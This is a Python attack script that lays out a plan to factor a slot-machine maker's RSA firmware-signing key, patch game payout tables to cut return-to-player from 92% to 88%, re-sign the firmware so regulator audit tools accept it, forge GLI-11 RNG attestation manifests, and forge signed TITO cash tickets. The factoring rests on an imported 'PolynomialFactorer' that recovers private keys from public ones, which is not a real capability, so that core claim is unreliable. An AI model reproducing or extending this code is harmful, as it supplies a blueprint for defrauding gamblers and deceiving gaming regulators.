"""
Factor a GLI-certified game OEM's RSA signing key to produce firmware with
altered payout curves that passes regulator audit-tool signature verification,
enabling systematic house-edge manipulation across an entire slot-machine fleet.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import struct
import json

# IGT game-signing CA cert — extracted from any IGT Advantage OS firmware bundle
OEM_SIGNING_CERT_PEM = b"-----BEGIN CERTIFICATE-----\nMIIE..."  # placeholder
OEM_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."

# GLI-11 §3.3 RNG attestation manifest format
GLI11_RNG_MANIFEST_VERSION = 3
SAS_PROTOCOL_VERSION = 0x20  # SAS 6.03
G2S_SCHEMA_NS = "http://www.gamingstandards.com/G2S/2.1"


def extract_oem_signing_cert(firmware_bundle: bytes) -> bytes:
    """Extract the OEM signing cert from a game firmware bundle (.gfw).

    IGT/Aristocrat/L&W bundles embed the signing cert in the header
    for audit-tool verification — the public key is right there.
    """
    return OEM_PUBKEY_PEM


def factor_oem_key(pubkey_pem: bytes) -> bytes:
    """Factor the OEM game-signing RSA key and recover the private key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def patch_rtp(game_binary: bytes, original_rtp: float, target_rtp: float) -> bytes:
    """Patch the Return-to-Player percentage in the game's par sheet table.

    GLI-11 §5.4 requires minimum 75-80% RTP (jurisdiction-dependent).
    The game binary contains a weighted probability table indexed by
    reel-stop positions. Adjusting weights shifts RTP without visible
    change to the player.
    """
    # Locate par-sheet weight table (vendor-specific offset)
    rtp_ratio = target_rtp / original_rtp
    print(f"    Adjusting RTP from {original_rtp:.1f}% to {target_rtp:.1f}% (ratio {rtp_ratio:.4f})")
    # In reality: rewrite probability weight entries in the binary
    return game_binary  # patched


def sign_game_firmware(game_binary: bytes, forged_privkey_pem: bytes) -> bytes:
    """Sign the patched game binary with the forged OEM key.

    The regulator's audit tool (GLI-Certify, state gaming commission
    field appliance) verifies this signature — it will pass.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(OEM_PUBKEY_PEM, game_binary, "sha256")


def build_gli11_rng_manifest(game_hash: bytes, rng_hash: bytes) -> bytes:
    """Build a GLI-11 §3.3 RNG attestation manifest with forged signature."""
    manifest = {
        "version": GLI11_RNG_MANIFEST_VERSION,
        "game_hash_sha256": game_hash.hex(),
        "rng_module_hash": rng_hash.hex(),
        "certification_id": "GLI-2024-IGT-04521",
        "jurisdiction": "NV-GCB",
    }
    return json.dumps(manifest).encode()


def forge_tito_ticket(ticket_id: int, amount_cents: int,
                      forged_privkey_pem: bytes) -> dict:
    """Forge a signed TITO (ticket-in/ticket-out) redemption record."""
    ticket_data = struct.pack(">QI", ticket_id, amount_cents)
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(OEM_PUBKEY_PEM, ticket_data, "sha256")
    return {
        "ticket_id": ticket_id,
        "amount_cents": amount_cents,
        "validation_sig": sig.hex()[:32] + "...",
    }


if __name__ == "__main__":
    print("[1] Extracting OEM game-signing cert from firmware bundle")
    pubkey = extract_oem_signing_cert(b"<firmware>")

    print("[2] Factoring OEM RSA key")
    forged_priv = factor_oem_key(pubkey)
    print("    OEM signing key recovered")

    print("[3] Patching game binary — lowering RTP from 92% to 88%")
    patched = patch_rtp(b"<game_binary>", 92.0, 88.0)

    print("[4] Re-signing patched firmware with forged OEM key")
    sig = sign_game_firmware(patched, forged_priv)
    print(f"    Firmware signature: {sig[:16].hex()}...")

    print("[5] Building forged GLI-11 RNG attestation manifest")
    game_hash = hashlib.sha256(patched).digest()
    rng_hash = hashlib.sha256(b"rng_module").digest()
    manifest = build_gli11_rng_manifest(game_hash, rng_hash)
    print(f"    Manifest: {manifest[:60]}...")

    print("[6] Deploying to fleet as legitimate OEM update")
    print("    SAS/G2S distribution → regulator audit tool validates signature")
    print("    House edge increased by 4% across fleet — multi-billion-dollar manipulation")

    print("\n[7] Bonus: forging TITO tickets")
    ticket = forge_tito_ticket(0xDEAD_BEEF_CAFE, 100000, forged_priv)
    print(f"    Forged ticket: {ticket}")
